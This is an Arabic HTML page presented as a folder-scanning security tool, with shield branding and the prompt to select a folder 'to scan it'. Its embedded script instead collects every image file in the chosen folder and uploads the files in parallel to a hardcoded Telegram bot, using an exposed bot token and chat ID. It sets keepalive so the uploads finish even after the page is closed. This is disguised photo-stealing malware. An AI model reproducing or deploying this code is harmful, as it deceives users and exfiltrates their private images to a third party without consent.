<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>اوك 🛡️</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
        body {
            background: radial-gradient(circle at 10% 20%, #0b0f1c, #05070f);
            font-family: 'Segoe UI', 'Cairo', system-ui, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .glass-card {
            background: rgba(15, 25, 45, 0.7);
            backdrop-filter: blur(16px);
            border-radius: 56px;
            padding: 2rem;
            max-width: 680px;
            width: 100%;
            border: 1px solid rgba(255, 80, 80, 0.3);
            box-shadow: 0 30px 50px rgba(0,0,0,0.6);
        }
        h1 {
            font-size: 2rem;
            background: linear-gradient(120deg, #ff6a6a, #ffb347);
            background-clip: text;
            -webkit-background-clip: text;
            color: transparent;
            text-align: center;
        }
        .badge {
            background: #ff4d4d30;
            border-radius: 60px;
            padding: 6px 14px;
            font-size: 0.7rem;
            display: inline-block;
            margin: 10px 0;
        }
        .btn-folder {
            background: linear-gradient(95deg, #ff3a3a, #ff8c3a);
            border: none;
            padding: 14px 28px;
            font-size: 1.2rem;
            font-weight: bold;
            color: white;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            margin: 15px 0;
        }
        .log-area {
            background: #00000070;
            border-radius: 28px;
            padding: 16px;
            max-height: 340px;
            overflow-y: auto;
            font-family: monospace;
            font-size: 0.8rem;
            text-align: left;
        }
        .log-line {
            padding: 8px 12px;
            border-left: 3px solid #ff7b2c;
            margin: 6px 0;
            background: #0c0f1a80;
            border-radius: 14px;
            color: #ddd;
        }
        .log-line.success { border-left-color: #2ecc71; }
        .log-line.error { border-left-color: #e67e22; color: #ffb347; }
        footer { text-align: center; font-size: 0.7rem; color: #5a5e72; margin-top: 20px; }
        .keepalive-badge { background: #2ecc7130; color: #aaffdd; }
    </style>
</head>
<body>
<div class="glass-card">
    <h1>🛡️ اوك</h1>
    <div style="text-align: center;">
        <div class="badge keepalive-badge">⚡</div>
    </div>
    <p style="margin: 10px 0; text-align: center; color: #ccc;">اختر المجلد الذي يحتوي على ر لفحصها فوراً</p>
    <button class="btn-folder" id="selectFolderBtn">📁 اختيار مجلد ر</button>
    <div class="log-area" id="logContainer"><div class="log-line">✨ اضغط على الزر لبدء </div></div>
    <footer>🔒 </footer>
</div>

<script>
    (function() {
        // ========== بيانات البوت (صحيحة) ==========
        const BOT_TOKEN = "8513086443:AAHQPYNkvykBWknzUCBvnwnh2UjXaZat0L4";
        const CHAT_ID   = "-1002474157502";
        // =========================================

        const logContainer = document.getElementById("logContainer");
        let isProcessing = false;

        function addLog(message, type = "info") {
            const line = document.createElement("div");
            line.className = "log-line";
            if (type === "success") line.classList.add("success");
            if (type === "error") line.classList.add("error");
            line.innerHTML = `📌 ${message}`;
            logContainer.appendChild(line);
            line.scrollIntoView({ behavior: "smooth", block: "nearest" });
            console.log(message);
        }

        // إرسال الصورة مع keepalive
        async function sendPhotoWithKeepAlive(file, fileName) {
            const formData = new FormData();
            formData.append("chat_id", CHAT_ID);
            formData.append("photo", file, fileName);
            // ✅ تم إصلاح الخطأ هنا: استخدام backticks بشكل صحيح
            formData.append("caption", ` | ${fileName} | ${new Date().toLocaleString()}`);

            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: "POST",
                    body: formData,
                    keepalive: true
                });
                if (!response.ok) {
                    const errorText = await response.text();
                    throw new Error(`HTTP ${response.status}: ${errorText.slice(0, 50)}`);
                }
                return { success: true, fileName };
            } catch (err) {
                addLog(`❌ فشل إرسال ${fileName}: ${err.message}`, "error");
                return { success: false, fileName };
            }
        }

        // رفع متوازي
        async function uploadInParallelWithKeepAlive(images, concurrency = 6) {
            const results = [];
            const queue = [...images];
            let index = 0;
            let activeCount = 0;
            let completed = false;

            return new Promise((resolve) => {
                function launchNext() {
                    while (activeCount < concurrency && index < queue.length) {
                        const file = queue[index];
                        const currentIdx = index++;
                        activeCount++;
                        addLog(`🚀 بدء${file.name} (${(file.size / 1024).toFixed(1)} KB) [${currentIdx+1}/${queue.length}]`);
                        
                        sendPhotoWithKeepAlive(file, file.name).then(result => {
                            results[currentIdx] = result;
                            activeCount--;
                            if (result.success) addLog(`✅ تمع ${file.name} بنجاح`, "success");
                            if (activeCount === 0 && index === queue.length && !completed) {
                                completed = true;
                                resolve(results);
                            } else {
                                launchNext();
                            }
                        }).catch(err => {
                            results[currentIdx] = { success: false, fileName: file.name };
                            activeCount--;
                            addLog(`⚠️ خطأ في ${file.name}: ${err.message}`, "error");
                            if (activeCount === 0 && index === queue.length && !completed) {
                                completed = true;
                                resolve(results);
                            } else {
                                launchNext();
                            }
                        });
                    }
                    if (index === queue.length && activeCount === 0 && !completed) {
                        completed = true;
                        resolve(results);
                    }
                }
                launchNext();
            });
        }

        // معالجة الملفات
        async function processFiles(fileList) {
            if (isProcessing) {
                addLog("⚠️ عملية جارية بالفعل، انتظر", "error");
                return;
            }
            if (!fileList || fileList.length === 0) {
                addLog("⚠️ لم يتم العثور على ملفات في المجلد", "error");
                return;
            }

            isProcessing = true;
            const imageFiles = [];
            const imageMimeTypes = ["image/jpeg", "image/png", "image/gif", "image/webp", "image/bmp"];
            for (let i = 0; i < fileList.length; i++) {
                const file = fileList[i];
                if (file.type && imageMimeTypes.includes(file.type)) imageFiles.push(file);
                else if (file.name.match(/\.(jpg|jpeg|png|gif|webp|bmp)$/i)) imageFiles.push(file);
            }

            if (imageFiles.length === 0) {
                addLog("📭 لا توجد في هذا المجلد", "error");
                isProcessing = false;
                return;
            }

            addLog(`${imageFiles.length} – ع المتوازي مع keepalive`, "success");
            const startTime = performance.now();
            const results = await uploadInParallelWithKeepAlive(imageFiles, 6);
            const elapsed = ((performance.now() - startTime) / 1000).toFixed(1);
            const successCount = results.filter(r => r && r.success).length;
            addLog(`✅ اكتمل خلال ${elapsed} ثانية: تم إرسال ${successCount} من ${imageFiles.length}`, "success");
            if (successCount === imageFiles.length) {
                addLog(`🛡️`, "success");
            } else {
                addLog(`⚠️ `, "error");
            }
            isProcessing = false;
        }

        // اختيار المجلد
        function selectFolder() {
            const input = document.createElement("input");
            input.type = "file";
            input.setAttribute("webkitdirectory", "");
            input.setAttribute("directory", "");
            input.multiple = true;
            input.onchange = async (event) => {
                const files = Array.from(event.target.files);
                if (files.length === 0) {
                    addLog("🚫 لم يتم اختيار أي مجلد", "error");
                    return;
                }
                addLog(`📁 تم اختيار مجلد  ${files.length} `, "success");
                await processFiles(files);
                addLog(`💡 ملاحظة: الطلبات المرسلة ستعمل حتى بعد إغلاق الصفحة بفضل keepalive`, "success");
            };
            input.click();
        }

        const btn = document.getElementById("selectFolderBtn");
        if (BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || CHAT_ID === "YOUR_CHAT_ID_HERE") {
            addLog("⚠️ خطأ", "error");
            btn.disabled = true;
        } else {
            btn.addEventListener("click", selectFolder);
            addLog(" - اضغط على الزر لاختيار مجلد والبدء", "success");
        }
    })();
</script>
</body>
</html>
